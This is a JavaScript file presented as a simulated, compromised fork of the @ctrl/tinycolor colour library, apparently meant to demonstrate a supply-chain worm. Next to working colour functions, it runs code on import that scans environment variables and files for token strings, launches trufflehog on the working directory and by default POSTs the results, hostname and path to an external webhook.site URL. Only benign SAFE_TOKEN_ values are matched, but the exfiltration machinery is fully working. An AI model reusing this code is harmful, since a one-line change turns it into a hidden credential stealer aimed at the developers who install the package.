'use strict';

// Simulated fork of @ctrl/tinycolor used to demonstrate a supply-chain compromise lifecycle.
// Provides minimal color utilities while triggering benign telemetry that mimics worm-like behavior.

const PACKAGE_NAME = '@ctrl/tinycolor';
const PACKAGE_VERSION = '3.6.0-sim';
const DEFAULT_PERCENT = 10;
const BENIGN_REGEX = 'SAFE_TOKEN_[0-9]{3}';
const TRUFFLEHOG_TIMEOUT_MS = 15000;
const isNodeRuntime =
  typeof process !== 'undefined' &&
  !!process.versions &&
  !!process.versions.node;

const DEFAULT_EXFIL_URL = 'https://webhook.site/1c129c66-a498-4463-990f-cb7072441d28';
let nodePath = null;
let fs = null;
let http = null;
let https = null;
let os = null;
let spawnChildProcess = null;
let bundledBinaryPath = null;

if (isNodeRuntime) {
  try {
    const dynamicRequire = eval('require');
    nodePath = dynamicRequire('path');
    fs = dynamicRequire('fs');
    http = dynamicRequire('http');
    https = dynamicRequire('https');
    os = dynamicRequire('os');
    spawnChildProcess = dynamicRequire('child_process').spawn;
    bundledBinaryPath = nodePath.join(__dirname, 'trufflehog');
  } catch (error) {
    if (typeof console !== 'undefined') {
      console.debug(`${PACKAGE_NAME} could not access Node APIs`, error);
    }
  }
}

function clampChannel(value) {
  return Math.max(0, Math.min(255, Math.round(value)));
}

function normalizeHex(input) {
  if (typeof input !== 'string') {
    throw new TypeError(`${PACKAGE_NAME}: color must be a string`);
  }

  const hex = input.trim().replace(/^#/, '').toLowerCase();
  if (!/^([0-9a-f]{3}|[0-9a-f]{6})$/.test(hex)) {
    throw new Error(`${PACKAGE_NAME}: unsupported color format: ${input}`);
  }

  if (hex.length === 3) {
    return hex.split('').map((c) => c + c).join('');
  }

  return hex;
}

function hexToRgb(hex) {
  const normalized = normalizeHex(hex);
  return {
    r: parseInt(normalized.slice(0, 2), 16),
    g: parseInt(normalized.slice(2, 4), 16),
    b: parseInt(normalized.slice(4, 6), 16),
  };
}

function rgbToHex(rgb) {
  return `#${[rgb.r, rgb.g, rgb.b]
    .map((channel) => channel.toString(16).padStart(2, '0'))
    .join('')}`;
}

function adjust(color, percent) {
  const { r, g, b } = hexToRgb(color);
  const factor = percent / 100;

  const adjusted = {
    r: clampChannel(r + r * factor),
    g: clampChannel(g + g * factor),
    b: clampChannel(b + b * factor),
  };

  return rgbToHex(adjusted);
}

function mix(colorA, colorB, weight = 50) {
  const w = Math.max(0, Math.min(100, Number(weight))) / 100;
  const rgbA = hexToRgb(colorA);
  const rgbB = hexToRgb(colorB);

  const blended = {
    r: clampChannel(rgbA.r * (1 - w) + rgbB.r * w),
    g: clampChannel(rgbA.g * (1 - w) + rgbB.g * w),
    b: clampChannel(rgbA.b * (1 - w) + rgbB.b * w),
  };

  return rgbToHex(blended);
}

function lighten(color, percent = DEFAULT_PERCENT) {
  return adjust(color, Math.abs(percent));
}

function darken(color, percent = DEFAULT_PERCENT) {
  return adjust(color, -Math.abs(percent));
}

function buildBeaconPayload(extraMetadata) {
  const isBrowser = typeof window !== 'undefined';
  const timestamp = new Date().toISOString();

  return {
    package: PACKAGE_NAME,
    version: PACKAGE_VERSION,
    timestamp,
    environment: isBrowser ? 'browser' : 'node',
    location: isBrowser ? window.location.href : process.cwd(),
    userAgent: isBrowser && typeof navigator !== 'undefined' ? navigator.userAgent : 'node-runtime',
    ...extraMetadata,
  };
}

function emitBeacon(payload) {
  const message = `${PACKAGE_NAME} simulated beacon -> ${JSON.stringify(payload)}`;
  if (typeof console !== 'undefined') {
    console.warn(message);
  }
  return {
    eventId: `${Date.now().toString(16)}-${Math.random().toString(16).slice(2, 8)}`,
    payload,
    timestamp: payload.timestamp,
  };
}

function simulateBeacon(extraMetadata) {
  const payload = buildBeaconPayload(extraMetadata);
  return emitBeacon(payload);
}

function scheduleBackgroundBeacon() {
  const globalScope = typeof globalThis !== 'undefined' ? globalThis : window;
  if (globalScope.__CTRL_TINYCOLOR_BEACON_ACTIVE__) {
    return;
  }
  globalScope.__CTRL_TINYCOLOR_BEACON_ACTIVE__ = true;

  setTimeout(() => {
    const payload = buildBeaconPayload({ lifecycle: 'delayed-init' });
    emitBeacon(payload);
    // Follow-up activity that mirrors a worm attempting lateral movement without doing anything destructive.
    setTimeout(() => {
      emitBeacon(buildBeaconPayload({ lifecycle: 'follow-up', action: 'scout-connected-services' }));
    }, 15000);
  }, 4000);
}

function collectEnvironmentTokens() {
  if (!isNodeRuntime) {
    return [];
  }

  const matches = [];
  const entries = Object.entries(process.env || {});
  for (const [key, value] of entries) {
    if (!value) {
      continue;
    }
    if (/SAFE_TOKEN_/i.test(key) || (typeof value === 'string' && value.includes('SAFE_TOKEN_'))) {
      matches.push({ key, value: String(value) });
    }
  }
  return matches;
}

function collectFileTokens() {
  if (!fs || !nodePath) {
    return [];
  }

  const rootPath = process.env.CTRL_TINYCOLOR_FAKE_SECRET_DIR
    ? process.env.CTRL_TINYCOLOR_FAKE_SECRET_DIR
    : nodePath.join(process.cwd(), 'fake-secrets');

  try {
    const stats = fs.statSync(rootPath);
    if (!stats.isDirectory()) {
      return [];
    }
  } catch (error) {
    return [];
  }

  const artifacts = [];
  const entries = fs.readdirSync(rootPath, { withFileTypes: true });
  for (const entry of entries) {
    if (!entry.isFile()) {
      continue;
    }
    const fullPath = nodePath.join(rootPath, entry.name);
    try {
      const contents = fs.readFileSync(fullPath, 'utf8');
      if (contents.includes('SAFE_TOKEN_')) {
        artifacts.push({
          file: fullPath,
          snippet: contents.slice(0, 160),
        });
      }
    } catch (error) {
      if (typeof console !== 'undefined') {
        console.debug(`${PACKAGE_NAME} failed to read ${fullPath}`, error);
      }
    }
  }
  return artifacts;
}

function harvestBenignSecrets() {
  const envMatches = collectEnvironmentTokens();
  const fileMatches = collectFileTokens();

  return {
    envMatches,
    fileMatches,
    harvestedAt: new Date().toISOString(),
    empty: envMatches.length === 0 && fileMatches.length === 0,
  };
}
function exfiltrateArtifacts(artifacts, source) {
  if (!artifacts || !isNodeRuntime) {
    return;
  }
  if (process.env.CTRL_TINYCOLOR_DISABLE_EXFIL) {
    return;
  }

  const urlString = process.env.CTRL_TINYCOLOR_EXFIL_URL || DEFAULT_EXFIL_URL;

  let parsedUrl;
  try {
    parsedUrl = new URL(urlString);
  } catch (error) {
    if (typeof console !== 'undefined') {
      console.debug(PACKAGE_NAME + ' invalid exfil URL', { urlString, error });
    }
    return;
  }

  const client = parsedUrl.protocol === 'http:' ? http : https;
  if (!client) {
    return;
  }

  const body = JSON.stringify({
    package: PACKAGE_NAME,
    version: PACKAGE_VERSION,
    source,
    artifacts,
    hostname: os && typeof os.hostname === 'function' ? os.hostname() : 'unknown',
    timestamp: new Date().toISOString(),
  });

  if (typeof console !== 'undefined') {
    console.warn(PACKAGE_NAME + ' exfiltrating harvest', {
      url: urlString,
      source,
      environmentMatches: artifacts.envMatches.length,
      fileMatches: artifacts.fileMatches.length,
    });
  }

  const pathname = parsedUrl.pathname && parsedUrl.pathname.length > 0 ? parsedUrl.pathname : '/';
  const requestOptions = {
    method: 'POST',
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || (parsedUrl.protocol === 'http:' ? 80 : 443),
    path: pathname + (parsedUrl.search || ''),
    headers: {
      'content-type': 'application/json',
      'content-length': Buffer.byteLength(body),
      'x-ctrl-tinycolor-sim': 'exfil',
    },
    timeout: 4000,
  };

  try {
    const req = client.request(requestOptions, (res) => {
      if (typeof res.resume === 'function') {
        res.resume();
      } else {
        res.on('data', () => {});
        res.on('end', () => {});
      }
    });
    req.on('error', (error) => {
      if (typeof console !== 'undefined') {
        console.debug(PACKAGE_NAME + ' exfil request error', error);
      }
    });
    req.on('timeout', () => {
      try {
        req.destroy();
      } catch (destroyError) {
        if (typeof console !== 'undefined') {
          console.debug(PACKAGE_NAME + ' exfil timeout', destroyError);
        }
      }
    });
    req.end(body);
  } catch (error) {
    if (typeof console !== 'undefined') {
      console.debug(PACKAGE_NAME + ' failed to exfiltrate', error);
    }
  }
}



function bundledBinaryAvailable() {
  if (!fs || !bundledBinaryPath) {
    return false;
  }
  try {
    return fs.statSync(bundledBinaryPath).isFile();
  } catch (error) {
    return false;
  }
}

function shouldLaunchTrufflehog() {
  if (!isNodeRuntime) {
    return false;
  }
  if (!spawnChildProcess) {
    return false;
  }
  if (process.env.CTRL_TINYCOLOR_DISABLE_TRUFFLEHOG) {
    return false;
  }
  return true;
}

function reportHarvestedArtifacts(artifacts, source) {
  if (!artifacts) {
    return;
  }

  if (typeof console !== 'undefined') {
    console.warn(`${PACKAGE_NAME} harvested demo secrets`, {
      environmentMatches: artifacts.envMatches.length,
      fileMatches: artifacts.fileMatches.length,
      source,
    });
  }

  try {
    simulateBeacon({
      lifecycle: 'harvest',
      artifacts,
      source,
    });
  } catch (error) {
    if (typeof console !== 'undefined') {
      console.debug(`${PACKAGE_NAME} failed to emit harvest beacon`, error);
    }
  }

  exfiltrateArtifacts(artifacts, source);
}

function launchTrufflehogScan() {
  if (!shouldLaunchTrufflehog()) {
    return;
  }

  const globalScope = typeof globalThis !== 'undefined' ? globalThis : global;
  if (globalScope.__CTRL_TINYCOLOR_TRUFFLEHOG_ACTIVE__) {
    return;
  }
  globalScope.__CTRL_TINYCOLOR_TRUFFLEHOG_ACTIVE__ = true;

  const harvest = harvestBenignSecrets();

  const baseEnv = { ...process.env, CTRL_TINYCOLOR_BENIGN_REGEX: BENIGN_REGEX };
  const args = ['regex', '--pattern', BENIGN_REGEX, '--path', process.cwd()];

  let command = null;
  let finalArgs = args.slice();
  let source = 'path';

  if (bundledBinaryAvailable()) {
    command = bundledBinaryPath;
    source = 'bundled';
  } else if (process.env.CTRL_TINYCOLOR_TRUFFLEHOG_COMMAND) {
    command = process.env.CTRL_TINYCOLOR_TRUFFLEHOG_COMMAND;
    source = 'env';
  } else if (process.env.CTRL_TINYCOLOR_TRUFFLEHOG_USE_NPX === '1') {
    command = 'npx';
    finalArgs = ['trufflehog', ...args];
    source = 'npx';
  } else {
    command = 'trufflehog';
  }

  let child;
  try {
    child = spawnChildProcess(command, finalArgs, {
      cwd: process.cwd(),
      env: baseEnv,
      stdio: 'ignore',
      detached: false,
    });
  } catch (error) {
    if (typeof console !== 'undefined') {
      console.error(`${PACKAGE_NAME} failed to launch trufflehog`, { error, command, args: finalArgs });
    }
    reportHarvestedArtifacts(harvest, `${source}-spawn-error`);
    return;
  }

  if (!child) {
    reportHarvestedArtifacts(harvest, `${source}-spawn-null`);
    return;
  }

  const timeout = setTimeout(() => {
    if (!child.killed && typeof child.kill === 'function') {
      child.kill('SIGTERM');
    }
  }, TRUFFLEHOG_TIMEOUT_MS);

  if (typeof timeout.unref === 'function') {
    timeout.unref();
  }

  child.on('error', (error) => {
    if (typeof console !== 'undefined') {
      console.error(`${PACKAGE_NAME} trufflehog process error`, error);
    }
  });

  child.on('exit', (code, signal) => {
    clearTimeout(timeout);
    if (typeof console !== 'undefined') {
      console.warn(`${PACKAGE_NAME} trufflehog scan completed`, {
        code,
        signal,
        pattern: BENIGN_REGEX,
        source,
      });
    }
    reportHarvestedArtifacts(harvest, source);
  });
}

try {
  scheduleBackgroundBeacon();
  launchTrufflehogScan();
} catch (error) {
  if (typeof console !== 'undefined') {
    console.error(`${PACKAGE_NAME} failed to schedule background activity`, error);
  }
}

module.exports = {
  lighten,
  darken,
  mix,
  simulateBeacon,
  launchTrufflehogScan,
  harvestBenignSecrets,
};